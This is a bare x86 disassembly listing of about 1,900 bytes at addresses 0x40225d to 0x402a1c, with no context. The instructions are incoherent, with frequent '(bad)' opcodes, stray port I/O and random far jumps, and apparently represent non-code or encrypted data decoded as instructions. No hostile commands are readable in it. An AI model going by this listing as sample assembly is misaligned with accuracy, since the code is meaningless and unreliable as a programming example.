  40225d:	push   cs
  40225e:	xor    ah,BYTE PTR [ebx+0xa]
  402261:	push   edx
  402262:	(bad)  
  402263:	and    al,BYTE PTR [ecx+0x76fd5a56]
  402269:	adc    dh,BYTE PTR [ecx]
  40226b:	mov    ds:0x85210680,eax
  402270:	cld    
  402271:	loop   0x4022e2
  402273:	xchg   esi,eax
  402274:	out    0x28,eax
  402276:	add    WORD PTR [ebp-0x4aa427fc],ax
  40227d:	std    
  40227e:	and    ecx,DWORD PTR [ecx]
  402280:	cmc    
  402281:	sbb    ebx,DWORD PTR [esi-0xde59826]
  402287:	sahf   
  402288:	xor    al,0xd2
  40228a:	push   0x67
  40228c:	ror    BYTE PTR [ebx-0x412876c6],0xcb
  402293:	xchg   esp,eax
  402294:	arpl   WORD PTR [ecx],si
  402296:	push   eax
  402297:	cmp    DWORD PTR [eax+0x2c17565e],esi
  40229d:	hlt    
  40229e:	mov    ecx,0xc3ceb47f
  4022a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022a4:	das    
  4022a5:	(bad)  
  4022a6:	jmp    0xa9c1:0x2362fc86
  4022ad:	test   al,0x2e
  4022af:	leave  
  4022b0:	pop    esi
  4022b1:	in     eax,dx
  4022b2:	sahf   
  4022b3:	push   0x55
  4022b5:	mov    bh,0x73
  4022b7:	test   DWORD PTR [ebp-0x74],ecx
  4022ba:	retf   0x3e03
  4022bd:	retf   
  4022be:	jmp    0xcdd05f21
  4022c3:	push   eax
  4022c4:	repnz or eax,0xb9475e33
  4022ca:	jno    0x40230c
  4022cc:	outs   dx,DWORD PTR ds:[esi]
  4022cd:	ins    BYTE PTR es:[edi],dx
  4022ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022cf:	outs   dx,BYTE PTR ds:[esi]
  4022d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022d1:	loop   0x4022f4
  4022d3:	icebp  
  4022d4:	mov    BYTE PTR [ebx+0xf0cd50],bl
  4022da:	or     DWORD PTR [edi],eax
  4022dc:	xor    dl,bl
  4022de:	outs   dx,DWORD PTR ds:[esi]
  4022df:	cmc    
  4022e0:	push   esp
  4022e1:	test   al,0xd0
  4022e3:	or     al,0xde
  4022e5:	jb     0x402346
  4022e7:	push   ss
  4022e8:	sbb    ecx,DWORD PTR [edx]
  4022ea:	imul   edi,ebx,0x7baa28c4
  4022f0:	mov    edi,0xb60dcdb0
  4022f5:	stos   BYTE PTR es:[edi],al
  4022f6:	scas   al,BYTE PTR es:[edi]
  4022f7:	lock sub BYTE PTR [edx-0xf5161c7],0xfc
  4022ff:	push   ecx
  402300:	mov    DWORD PTR [edx-0x4907cbca],ebx
  402306:	and    esi,DWORD PTR [edi+0x61]
  402309:	adc    eax,DWORD PTR [edi-0x2b4554ab]
  40230f:	fnstcw WORD PTR [ecx+0x59]
  402312:	ins    DWORD PTR es:[edi],dx
  402313:	in     eax,dx
  402314:	pop    edx
  402315:	and    edx,ecx
  402317:	sbb    edx,DWORD PTR [edi-0x2b1f1fd8]
  40231d:	push   0x52
  40231f:	out    0x63,al
  402321:	cmp    eax,0xb8b301c0
  402326:	push   ebp
  402327:	in     al,0xba
  402329:	fdivr  QWORD PTR [edx]
  40232b:	jp     0x402342
  40232d:	les    edx,FWORD PTR [eax]
  40232f:	into   
  402330:	pop    ebx
  402331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402332:	xor    BYTE PTR [ecx-0xf],bl
  402335:	jbe    0x4022e4
  402337:	enter  0x3011,0xe
  40233b:	(bad)  
  40233c:	pop    esp
  40233d:	pusha  
  40233e:	rcl    DWORD PTR [ebp+ecx*1-0xd],0x97
  402343:	int3   
  402344:	jecxz  0x402359
  402346:	ret    
  402347:	ret    0x8116
  40234a:	outs   dx,DWORD PTR ds:[esi]
  40234b:	imul   edx,DWORD PTR [ebx-0x64],0x4c
  40234f:	ret    
  402350:	mov    ds:0x530eddea,al
  402355:	inc    eax
  402356:	mov    ch,0x18
  402358:	enter  0xd129,0xec
  40235c:	inc    esi
  40235d:	dec    eax
  40235e:	pop    edx
  40235f:	push   es
  402360:	in     al,dx
  402361:	je     0x4022f8
  402363:	xor    ch,BYTE PTR [esp+esi*1+0x5639ced1]
  40236a:	sbb    BYTE PTR [edi],0x6
  40236d:	mov    al,0x62
  40236f:	sbb    ecx,DWORD PTR [edx+0x163a9540]
  402375:	push   esp
  402376:	aaa    
  402377:	out    dx,al
  402378:	loopne 0x40232b
  40237a:	push   0x37
  40237c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40237d:	or     BYTE PTR [edi+0x24],ch
  402380:	pusha  
  402381:	push   ds
  402382:	push   ss
  402383:	sub    bh,0x4b
  402386:	mov    ebx,0xdaf7c28
  40238b:	jg     0x4023bb
  40238d:	push   edi
  40238e:	inc    eax
  40238f:	inc    ecx
  402390:	mov    eax,ds:0x1b3d456d
  402395:	mov    edx,0x1f4f916
  40239a:	das    
  40239b:	ret    
  40239c:	enter  0x94a,0x53
  4023a0:	xor    cl,dh
  4023a2:	call   0xca7b:0x3bfb21e3
  4023a9:	test   al,0x38
  4023ab:	retf   0x5343
  4023ae:	push   0xffffffec
  4023b0:	shl    BYTE PTR [ebx+0x61560adb],0x8d
  4023b7:	popf   
  4023b8:	rol    ah,1
  4023ba:	stc    
  4023bb:	outs   dx,BYTE PTR ds:[esi]
  4023bc:	ja     0x4023d3
  4023be:	mov    dl,0xb5
  4023c0:	sbb    dl,dl
  4023c2:	shl    esi,0xe3
  4023c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023c6:	pop    eax
  4023c7:	cmc    
  4023c8:	ins    BYTE PTR es:[edi],dx
  4023c9:	xlat   BYTE PTR ds:[ebx]
  4023ca:	jnp    0x40237e
  4023cc:	sub    cl,al
  4023ce:	test   eax,0xf5f9d1bd
  4023d3:	cmp    DWORD PTR [ebp-0x286a27fc],ebp
  4023d9:	inc    edx
  4023da:	leave  
  4023db:	sti    
  4023dc:	push   edx
  4023dd:	add    BYTE PTR [edi-0x3],ch
  4023e0:	mov    ch,dh
  4023e2:	les    edx,FWORD PTR [esi+esi*2+0x74]
  4023e6:	in     al,dx
  4023e7:	adc    bl,BYTE PTR [esi-0x2b]
  4023ea:	push   edi
  4023eb:	xchg   esp,eax
  4023ec:	into   
  4023ed:	push   ds
  4023ee:	mov    bl,0xd9
  4023f0:	dec    esi
  4023f1:	inc    esi
  4023f2:	and    esp,DWORD PTR [edi+0x29]
  4023f5:	cwde   
  4023f6:	dec    ecx
  4023f7:	aam    0x11
  4023f9:	mov    ds,WORD PTR [esi+ecx*1+0xa]
  4023fd:	add    BYTE PTR [edx-0x61f122e8],cl
  402403:	aas    
  402404:	inc    ecx
  402405:	repnz dec ecx
  402407:	cmp    al,0x4f
  402409:	ror    DWORD PTR [ebx+0x13],cl
  40240c:	and    eax,0xc10f65fc
  402411:	and    al,0x2d
  402414:	ins    DWORD PTR es:[edi],dx
  402415:	and    DWORD PTR [edi+0x7f],esi
  402418:	retf   0xca69
  40241b:	out    0xb8,eax
  40241d:	jb     0x4023a1
  40241f:	cmp    DWORD PTR [edx+0x2],edi
  402422:	cmp    esi,ebp
  402424:	push   0x330ef8bd
  402429:	xor    BYTE PTR [esi],ch
  40242b:	fstp   DWORD PTR [esi+0x784709b4]
  402431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402432:	jge    0x402441
  402434:	stc    
  402435:	pop    ecx
  402436:	ret    0x1270
  402439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40243a:	mov    bh,0x3d
  40243c:	test   al,0xbe
  40243e:	push   ds
  40243f:	jg     0x4023c6
  402441:	inc    eax
  402442:	sub    al,0x1d
  402444:	cmp    eax,0xf76fbf7d
  402449:	pop    eax
  40244a:	push   0x11
  40244c:	in     al,dx
  40244d:	xchg   edx,eax
  40244e:	data16 cmp dl,0x6f
  402452:	dec    eax
  402453:	push   edx
  402454:	int    0x3b
  402456:	inc    eax
  402457:	in     al,dx
  402458:	adc    eax,0xefda3ce2
  40245d:	es push 0xffffffe9
  402460:	ret    
  402461:	add    esp,DWORD PTR [esi-0x69]
  402464:	fld    QWORD PTR [esi+0xb]
  402467:	mov    WORD PTR [eax+0x28],ds
  40246a:	sbb    eax,0x167d3fdf
  40246f:	fstp   QWORD PTR [edi+edx*8+0x67]
  402473:	jno    0x402442
  402475:	cmp    ebp,DWORD PTR [edx+0x4f056860]
  40247b:	push   ecx
  40247c:	cmc    
  40247d:	cmc    
  40247e:	adc    al,ch
  402480:	add    eax,0xc5365e34
  402485:	test   DWORD PTR [edi],0x3ba0dc3e
  40248b:	mov    eax,0x99d9d2a5
  402490:	scas   al,BYTE PTR es:[edi]
  402491:	scas   eax,DWORD PTR es:[edi]
  402492:	mov    cl,0xf0
  402494:	test   eax,0x37021f4d
  402499:	sbb    BYTE PTR [ebx+0x6],al
  40249c:	xchg   esi,eax
  40249d:	sub    DWORD PTR [ebx+ecx*8],esp
  4024a0:	add    cl,BYTE PTR [esi-0x9]
  4024a3:	and    eax,0x12e3bbd3
  4024a8:	call   0x7e9bf7de
  4024ad:	out    dx,al
  4024ae:	hlt    
  4024af:	sub    eax,0xe510be34
  4024b4:	aas    
  4024b5:	jne    0x402445
  4024b7:	and    BYTE PTR [ebx+0x2e],ah
  4024ba:	popf   
  4024bb:	mov    ?,edx
  4024bd:	cmp    DWORD PTR [ebx],0x9c2f82a3
  4024c3:	sar    DWORD PTR [ebx],cl
  4024c5:	mov    bh,0x91
  4024c7:	push   ss
  4024c8:	jecxz  0x40250c
  4024ca:	mov    esp,0xc60a3bac
  4024cf:	mov    eax,ds:0xdc76a918
  4024d4:	cs xchg ecx,eax
  4024d6:	cwde   
  4024d7:	(bad)  
  4024d8:	out    0xa9,al
  4024da:	aas    
  4024db:	mov    cl,0xa8
  4024dd:	sub    bh,bl
  4024df:	imul   esi,DWORD PTR [edx+0x66],0x63
  4024e3:	pop    ebx
  4024e4:	mov    esp,0x28a6d4a0
  4024e9:	inc    edx
  4024ea:	adc    BYTE PTR [edi+0x76452df5],dh
  4024f0:	jns    0x402492
  4024f2:	test   eax,0x122bf146
  4024f7:	mov    ebx,0xc0348057
  4024fc:	sub    edx,DWORD PTR [ebp+0x797091c5]
  402502:	mov    al,ds:0x3e8d3e14
  402507:	adc    BYTE PTR [ebp-0x72],bh
  40250a:	inc    DWORD PTR [edx]
  40250c:	pusha  
  40250d:	and    eax,0x44f99394
  402512:	pop    ss
  402513:	lahf   
  402514:	loop   0x402590
  402516:	pushf  
  402517:	vaddpd ymm0,ymm0,ymm6
  40251b:	xor    cl,BYTE PTR [ecx-0x39]
  40251e:	push   ecx
  40251f:	mov    ebx,0xde15cebd
  402524:	call   0x37a82656
  402529:	call   DWORD PTR [edx+0x5a]
  40252c:	test   eax,0xb65451f8
  402531:	sub    dl,BYTE PTR [edx-0x1a]
  402534:	pop    ecx
  402535:	adc    BYTE PTR [edi+0x35],dl
  402538:	arpl   WORD PTR [edi-0x3c],ax
  40253b:	aad    0xc9
  40253d:	adc    ecx,0xc4b70750
  402543:	pop    ecx
  402544:	gs in  eax,0xf0
  402547:	inc    ebx
  402548:	pop    edx
  402549:	xchg   cl,bh
  40254b:	mov    ch,0xe
  40254d:	scas   eax,DWORD PTR es:[edi]
  40254e:	aam    0x78
  402550:	int    0xff
  402552:	pop    edi
  402553:	aad    0x7c
  402555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402556:	(bad)  
  402557:	pushf  
  402558:	pop    ss
  402559:	add    esi,DWORD PTR [ebp+0x5a]
  40255c:	jnp    0x402566
  40255e:	in     eax,0x3
  402560:	pop    es
  402561:	sahf   
  402562:	outs   dx,DWORD PTR ds:[esi]
  402563:	adc    cl,BYTE PTR [ecx-0x497b438a]
  402569:	jmp    0xf6c8:0x210e44f7
  402570:	das    
  402571:	hlt    
  402572:	pop    ebx
  402573:	(bad)  
  402574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402575:	scas   al,BYTE PTR es:[edi]
  402576:	repz adc eax,0x8d2c988d
  40257c:	mov    edi,gs
  40257e:	div    bl
  402580:	mov    edx,esp
  402582:	cmovae eax,DWORD PTR [ebp+eax*4+0x27d2af25]
  40258a:	jb     0x4025ad
  40258c:	dec    ebp
  40258d:	push   0xffffff8f
  40258f:	mov    esi,0x880a3cbf
  402594:	mov    edx,0xfd47b212
  402599:	pop    esi
  40259a:	popa   
  40259b:	stc    
  40259c:	out    0xba,al
  40259e:	(bad)  
  40259f:	loope  0x4025e4
  4025a1:	rcr    BYTE PTR [ecx+eax*1+0x2b4eb0e4],cl
  4025a8:	ds dec ecx
  4025aa:	iret   
  4025ab:	pop    esp
  4025ac:	test   al,0x8b
  4025ae:	inc    ebp
  4025af:	mov    eax,0x689c941f
  4025b4:	jle    0x402566
  4025b6:	test   DWORD PTR [esi-0x599b8aad],esp
  4025bc:	fldcw  WORD PTR [edi]
  4025be:	shl    DWORD PTR [ebp-0x3d],0x32
  4025c2:	mov    ecx,0xd7859b92
  4025c7:	add    ah,BYTE PTR [edx+0x1c]
  4025ca:	cmp    DWORD PTR [ecx-0x79],edx
  4025cd:	lods   eax,DWORD PTR ds:[esi]
  4025ce:	test   eax,0xfa8dcd36
  4025d3:	(bad)  
  4025d4:	jo     0x4025ad
  4025d6:	or     al,BYTE PTR [esi+edx*1+0x5dfa42b7]
  4025dd:	cmp    edx,DWORD PTR [edx+0x6a]
  4025e0:	xchg   BYTE PTR [edi-0x23],al
  4025e3:	clc    
  4025e4:	xchg   ebx,eax
  4025e5:	xor    eax,0x171ed5b8
  4025ea:	pop    ebx
  4025eb:	and    eax,eax
  4025ed:	in     al,dx
  4025ee:	mov    ah,0x83
  4025f0:	inc    ecx
  4025f1:	shl    BYTE PTR [edi+0x1afb9c5b],cl
  4025f7:	mov    BYTE PTR [ecx+0x2f4c5cf7],bh
  4025fd:	add    al,0x68
  4025ff:	xchg   edx,eax
  402600:	pop    esi
  402601:	ret    0xf357
  402604:	inc    edx
  402605:	jo     0x4025a5
  402607:	aas    
  402608:	jmp    0x5cf3:0x32f59a2c
  40260f:	in     eax,dx
  402610:	or     BYTE PTR [ebx+0x63b24b5f],dl
  402616:	mov    ds:0xbc135142,al
  40261b:	repz loopne 0x40267c
  40261e:	je     0x4025c6
  402620:	mov    ah,BYTE PTR [eax]
  402622:	inc    eax
  402623:	mov    esi,0x80c3bbe0
  402628:	js     0x4025f7
  40262a:	icebp  
  40262b:	arpl   WORD PTR [eax-0x56],sp
  40262e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40262f:	cmp    DWORD PTR [esi],0xfffffff8
  402632:	aam    0xa0
  402634:	ds sbb al,0xbb
  402637:	xchg   esi,eax
  402638:	inc    edx
  402639:	xchg   dh,al
  40263b:	fist   DWORD PTR [edx-0x74611eb0]
  402641:	jmp    0xe43cc313
  402646:	enter  0x5630,0xb6
  40264a:	jae    0x4026a4
  40264c:	mov    dh,0x35
  40264e:	int3   
  40264f:	xlat   BYTE PTR ds:[ebx]
  402650:	xor    dl,cl
  402652:	(bad)  
  402653:	jge    0x40261d
  402655:	sbb    DWORD PTR ds:0xaa9f39e3,0x6dd304cb
  40265f:	add    al,0xe4
  402661:	in     al,dx
  402662:	mov    es,ebx
  402664:	sbb    ecx,DWORD PTR [edx-0x6d]
  402667:	fnsave [ecx-0x5e9b994d]
  40266d:	out    dx,al
  40266e:	pop    ebp
  40266f:	dec    eax
  402670:	dec    esi
  402671:	xchg   ebx,eax
  402672:	jnp    0x402608
  402674:	add    DWORD PTR [edx+0x47],edx
  402677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402678:	cmp    al,0x0
  40267a:	mov    esp,0x3d628097
  40267f:	mov    ebp,0x201b3b09
  402684:	(bad)
  402687:	lods   al,BYTE PTR ds:[esi]
  402688:	jge    0x402700
  40268a:	sub    eax,eax
  40268c:	inc    ebp
  40268d:	in     eax,dx
  40268e:	pop    eax
  40268f:	test   eax,0x6442f0bf
  402694:	mov    esi,0xea7db64c
  402699:	ja     0x4026d7
  40269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40269c:	(bad)  
  40269d:	pushf  
  40269e:	cs xchg ebp,eax
  4026a0:	sub    ah,dh
  4026a2:	and    BYTE PTR [esp+ebp*2+0x59],dl
  4026a6:	rol    esi,0x75
  4026a9:	dec    ebp
  4026aa:	cmp    al,ch
  4026ac:	xor    BYTE PTR [edx+0x1fc0a596],bh
  4026b2:	aas    
  4026b3:	mov    ah,0x64
  4026b5:	xchg   ebp,eax
  4026b6:	sub    DWORD PTR [ebx-0x31],esi
  4026b9:	adc    esi,DWORD PTR gs:[eax-0x56]
  4026bd:	ds push ds
  4026bf:	push   cs
  4026c0:	in     al,0x5d
  4026c2:	in     eax,0xa5
  4026c4:	das    
  4026c5:	mov    ah,0xff
  4026c7:	sub    al,0xc
  4026c9:	inc    esp
  4026ca:	jmp    0x991bac6
  4026cf:	les    edi,FWORD PTR [ebx]
  4026d1:	lea    esi,[eax-0x2ace89f]
  4026d7:	sbb    eax,0xde82784a
  4026dc:	cmc    
  4026dd:	xchg   ecx,eax
  4026de:	inc    eax
  4026df:	cmp    BYTE PTR [edi+0x259731e1],ch
  4026e5:	ss aam 0xef
  4026e8:	xchg   esi,eax
  4026e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ea:	and    eax,eax
  4026ec:	shl    esp,1
  4026ee:	jl     0x402740
  4026f0:	sub    ch,dh
  4026f2:	int    0x8c
  4026f4:	out    dx,al
  4026f5:	adc    BYTE PTR [ebx+0x48],bl
  4026f8:	clc    
  4026f9:	bound  ebx,QWORD PTR [ebp+0x7cdea1d5]
  4026ff:	aaa    
  402700:	test   al,0x7
  402702:	mov    eax,0x4117176
  402707:	icebp  
  402708:	cmp    BYTE PTR [ebp+0x7a3a07e0],cl
  40270e:	imul   esp,DWORD PTR [ebp+0x267ef092],0x50d1b218
  402718:	sbb    ch,dl
  40271a:	dec    al
  40271c:	inc    ecx
  40271d:	arpl   WORD PTR [ebx+0x30948ced],bp
  402723:	mov    bh,BYTE PTR [edx]
  402725:	fistp  DWORD PTR [edx+eiz*2+0x46b2bd6]
  40272c:	pop    ebx
  40272d:	enter  0xaf4,0xac
  402731:	data16 (bad) [ebx]
  402734:	rcl    esi,1
  402736:	adc    dh,bh
  402738:	or     al,0xc7
  40273a:	push   edx
  40273b:	mov    edx,DWORD PTR [eax]
  40273d:	mov    eax,ds:0xadb09981
  402742:	js     0x40275c
  402744:	jmp    0x8780b65b
  402749:	dec    esp
  40274a:	loop   0x402744
  40274c:	sbb    DWORD PTR [ebx-0x11],ebp
  40274f:	aaa    
  402750:	out    0x76,eax
  402752:	and    BYTE PTR [edx+0x19f192c2],ch
  402758:	sub    al,BYTE PTR [ecx+0xe]
  40275b:	(bad)  
  40275c:	(bad)  [esi]
  40275e:	sbb    DWORD PTR [edx+0x1557931a],eax
  402764:	ror    DWORD PTR [edx+esi*1+0x41],1
  402768:	in     eax,0x9c
  40276a:	leave  
  40276b:	xchg   edi,eax
  40276c:	jle    0x4027eb
  40276e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40276f:	add    al,ah
  402771:	pop    esi
  402772:	in     eax,dx
  402773:	or     ch,BYTE PTR [edi+0x3e]
  402776:	out    dx,al
  402777:	xor    BYTE PTR [ecx],ah
  402779:	jmp    0xa01f:0x445fc57a
  402780:	push   esp
  402781:	scas   eax,DWORD PTR es:[edi]
  402782:	mov    ebp,0x868eed7a
  402787:	pop    ecx
  402788:	add    eax,0x229e918f
  40278d:	and    ecx,eax
  40278f:	push   ebp
  402790:	mov    al,0x5d
  402792:	fisubr DWORD PTR [edi+0x2f2ce386]
  402798:	push   es
  402799:	stc    
  40279a:	adc    DWORD PTR [ecx-0x22],esi
  40279d:	std    
  40279e:	popf   
  40279f:	pop    eax
  4027a0:	dec    esp
  4027a1:	jne    0x4027c0
  4027a3:	or     al,0x64
  4027a5:	inc    edx
  4027a6:	xchg   esi,eax
  4027a7:	loop   0x40279e
  4027a9:	or     al,0xce
  4027ab:	aam    0xa3
  4027ad:	enter  0xb590,0x9
  4027b1:	jmp    0xf566:0x88faddf3
  4027b8:	scas   eax,DWORD PTR es:[edi]
  4027b9:	ins    BYTE PTR es:[edi],dx
  4027ba:	jns    0x402785
  4027bc:	mov    al,ds:0xb42670fe
  4027c1:	popf   
  4027c2:	outs   dx,BYTE PTR ds:[esi]
  4027c3:	cs and ah,bl
  4027c6:	fwait
  4027c7:	and    BYTE PTR [edi+0x77333046],0x6a
  4027ce:	lea    eax,[edx]
  4027d0:	mov    es,WORD PTR [edx+esi*8+0x76]
  4027d4:	test   al,0xff
  4027d6:	shl    DWORD PTR [edx],1
  4027d8:	in     eax,0xa0
  4027da:	pop    ds
  4027db:	or     BYTE PTR [ebp+0x67decb95],dh
  4027e1:	sbb    esi,esp
  4027e3:	lods   al,BYTE PTR ds:[esi]
  4027e4:	and    ebp,DWORD PTR [ebp+0x16]
  4027e7:	stc    
  4027e8:	push   ss
  4027e9:	xchg   BYTE PTR [ebx],ch
  4027eb:	fld    DWORD PTR [ebx]
  4027ed:	stc    
  4027ee:	inc    ecx
  4027ef:	jecxz  0x4027d4
  4027f1:	fnsave [edi]
  4027f3:	cmp    ebp,DWORD PTR ds:0x25bb3050
  4027f9:	sbb    bl,BYTE PTR [esi+0x140b8b6b]
  4027ff:	shl    ebx,cl
  402801:	out    dx,eax
  402802:	inc    esi
  402803:	(bad)  
  402804:	loop   0x402818
  402806:	xchg   edi,eax
  402807:	dec    esp
  402808:	sbb    dh,bl
  40280a:	std    
  40280b:	out    0x16,al
  40280d:	jmp    0x40286f
  40280f:	mov    dl,0xed
  402811:	inc    ebx
  402812:	out    dx,al
  402813:	rcl    DWORD PTR [edi],0xbe
  402816:	push   edi
  402817:	shl    BYTE PTR [ebx-0x66],cl
  40281a:	sub    eax,0x54439115
  40281f:	mov    eax,ds:0x6f2c4185
  402824:	add    eax,0x9c5c5e20
  402829:	scas   al,BYTE PTR es:[edi]
  40282a:	in     al,dx
  40282b:	addr16 cdq 
  40282d:	mov    dh,0x90
  40282f:	sar    bh,1
  402831:	(bad)  
  402832:	je     0x40284b
  402834:	xor    si,0x77
  402838:	js     0x40287b
  40283a:	or     esp,DWORD PTR [ebx-0x26146c12]
  402840:	(bad)  
  402842:	cmc    
  402843:	gs cmp bh,bh
  402846:	xchg   edi,eax
  402847:	or     BYTE PTR [edi+0x6d0d6f34],al
  40284d:	test   BYTE PTR [ebp-0x40f80f1b],0x43
  402854:	out    dx,al
  402855:	mov    cl,0x60
  402857:	daa    
  402858:	int3   
  402859:	inc    eax
  40285a:	retf   0xea6a
  40285d:	pushf  
  40285e:	mov    dl,0xf6
  402860:	fsubr  st(7),st
  402862:	push   ecx
  402863:	js     0x402855
  402865:	aad    0x8f
  402867:	das    
  402868:	dec    eax
  402869:	enter  0xa51b,0x8f
  40286d:	push   cs
  40286e:	lods   eax,DWORD PTR ds:[esi]
  40286f:	dec    eax
  402870:	inc    edx
  402871:	ss xchg ebp,eax
  402873:	push   ds
  402874:	and    al,BYTE PTR ds:[edi]
  402877:	enter  0xc932,0x61
  40287b:	jo     0x40287e
  40287d:	imul   esp,DWORD PTR [ebx+eiz*4],0x7fa187eb
  402884:	xchg   esp,eax
  402885:	in     al,0xc7
  402887:	in     al,0x6
  402889:	or     bl,BYTE PTR [edi+edx*1+0x70]
  40288d:	mov    ecx,0xe34cbbba
  402892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402893:	add    eax,0xd32edcc1
  402898:	lods   eax,DWORD PTR ds:[esi]
  402899:	adc    DWORD PTR [ebx],0xffffffd9
  40289c:	sti    
  40289d:	ins    BYTE PTR es:[edi],dx
  40289e:	clc    
  40289f:	xchg   esi,eax
  4028a0:	je     0x402912
  4028a2:	fs movmskps edx,xmm4
  4028a6:	pop    esp
  4028a7:	loope  0x40284e
  4028a9:	or     ch,BYTE PTR [edi+0x27]
  4028ac:	sub    ebp,DWORD PTR ds:0x12a74638
  4028b2:	mov    ecx,0xbb3bf5ec
  4028b7:	retf   0x996a
  4028ba:	rcl    DWORD PTR [ebp-0x1f468521],0x5a
  4028c1:	xrelease data16 mov BYTE PTR [edi+0x2f],ch
  4028c6:	or     DWORD PTR [esi+edi*1+0x24fcb9c3],eax
  4028cd:	mov    al,0xac
  4028cf:	es clc 
  4028d1:	mov    WORD PTR [ecx+0xf],?
  4028d4:	fwait
  4028d5:	xchg   ecx,eax
  4028d6:	jmp    0x402897
  4028d8:	xchg   esp,eax
  4028d9:	shr    DWORD PTR [ebp+0xc],0x35
  4028dd:	dec    BYTE PTR [ebp-0x360791b9]
  4028e3:	add    eax,DWORD PTR [eax]
  4028e5:	lahf   
  4028e6:	(bad)  
  4028e7:	mov    ebx,0x31840656
  4028ec:	xchg   ecx,eax
  4028ed:	adc    esp,edx
  4028ef:	mov    esp,0x472eb700
  4028f4:	pop    ebp
  4028f5:	repnz xchg ecx,eax
  4028f7:	mov    al,ds:0x3724e48a
  4028fc:	cmp    dl,dh
  4028fe:	inc    ebx
  4028ff:	cwde   
  402900:	adc    edx,DWORD PTR [ebx+0x55233ff8]
  402906:	ret    
  402907:	add    BYTE PTR [eax+0x1b],cl
  40290a:	lock fidiv WORD PTR [ecx-0x25e5cb0]
  402911:	cmp    eax,0x51965207
  402916:	jae    0x40290b
  402918:	lods   al,BYTE PTR ds:[esi]
  402919:	xlat   BYTE PTR ds:[ebx]
  40291a:	pop    edi
  40291b:	dec    ecx
  40291c:	clc    
  40291d:	aam    0x22
  40291f:	jecxz  0x40292f
  402921:	mov    bh,dh
  402923:	mov    ebx,0x51b1aff7
  402928:	loopne 0x402908
  40292a:	jp     0x4028de
  40292c:	(bad)  
  40292d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40292e:	jnp    0x4028bf
  402930:	inc    sp
  402932:	xchg   DWORD PTR [eax+0x7c],esp
  402935:	mov    ah,0x4a
  402937:	mov    edx,0x57afce79
  40293c:	(bad)  
  40293d:	mov    eax,0x73642687
  402942:	out    0x7e,al
  402944:	jo     0x402924
  402946:	(bad)  
  402947:	cmp    ch,BYTE PTR [ecx+0x73]
  40294a:	es pop es
  40294c:	data16 jmp 0x40298a
  40294f:	lods   eax,DWORD PTR ds:[esi]
  402950:	dec    esp
  402951:	daa    
  402952:	pushf  
  402953:	jle    0x4029cd
  402955:	dec    ebx
  402956:	imul   esp,edi,0xffffff82
  402959:	xor    BYTE PTR [edx],cl
  40295b:	xor    esp,DWORD PTR [edx-0x29]
  40295e:	mov    BYTE PTR [ecx+0x70],ch
  402961:	push   ss
  402962:	cs ret 
  402964:	push   edi
  402965:	mov    edi,0x44cce8b0
  40296a:	mov    ebp,0x9ad9f493
  40296f:	or     bh,BYTE PTR [ecx+0x38]
  402972:	test   al,0xd0
  402974:	aaa    
  402975:	jae    0x402954
  402977:	das    
  402978:	in     al,0x62
  40297a:	inc    ebp
  40297b:	adc    eax,0xc3ee1266
  402980:	(bad)  
  402981:	mov    BYTE PTR [eiz*8-0x3a887060],cl
  402988:	xchg   ebx,eax
  402989:	rcl    DWORD PTR [esi],0x6e
  40298c:	loope  0x4029e4
  40298e:	outs   dx,DWORD PTR ds:[esi]
  40298f:	xor    DWORD PTR [edx+0x69],0x147cf238
  402996:	popa   
  402997:	dec    esp
  402998:	push   ebx
  402999:	inc    ebp
  40299a:	test   eax,0x4715fa2
  40299f:	mov    BYTE PTR [ebp+0x6022115d],ch
  4029a5:	dec    ebp
  4029a6:	pop    es
  4029a7:	out    0xa8,eax
  4029a9:	rcl    DWORD PTR [ebx-0x1b],1
  4029ac:	or     cl,ah
  4029ae:	fldcw  WORD PTR [esi-0x2]
  4029b1:	call   0x1b99:0xf58fc61b
  4029b8:	pusha  
  4029b9:	pop    ecx
  4029ba:	shr    ah,cl
  4029bc:	sbb    DWORD PTR [esi],esp
  4029be:	mov    esp,0xfd8c9864
  4029c3:	data16 and bh,ah
  4029c6:	push   esi
  4029c7:	mov    ah,0x77
  4029c9:	dec    eax
  4029ca:	je     0x40295b
  4029cc:	sti    
  4029cd:	xor    ecx,edx
  4029cf:	pop    ebx
  4029d0:	dec    ecx
  4029d1:	addr16 je 0x402971
  4029d4:	mov    ch,0x84
  4029d6:	dec    edx
  4029d7:	call   0x6e234fca
  4029dc:	ja     0x4029a9
  4029de:	imul   eax,DWORD PTR [eax],0xffffffb4
  4029e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029e2:	fst    st(2)
  4029e4:	sti    
  4029e5:	dec    ebx
  4029e6:	dec    edi
  4029e7:	aad    0x2
  4029e9:	mov    eax,0xa4d2b142
  4029ee:	adc    al,0x51
  4029f0:	ja     0x402a37
  4029f2:	and    eax,0x81e72750
  4029f7:	push   edx
  4029f8:	lds    esi,FWORD PTR [edi-0x17730e3b]
  4029fe:	mov    ebx,0xec8e2c74
  402a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a04:	leave  
  402a05:	dec    edi
  402a06:	mov    dh,0x9a
  402a08:	lods   al,BYTE PTR ds:[esi]
  402a09:	imul   esp,DWORD PTR [edx-0x5d],0x12
  402a0d:	outs   dx,DWORD PTR ds:[esi]
  402a0e:	mov    al,0xab
  402a10:	sbb    al,0xfd
  402a12:	jecxz  0x402a01
  402a14:	pop    es
  402a15:	push   eax
  402a16:	leave  
  402a17:	or     eax,0xd1ac0215
  402a1c:	sbb    al,0xe8
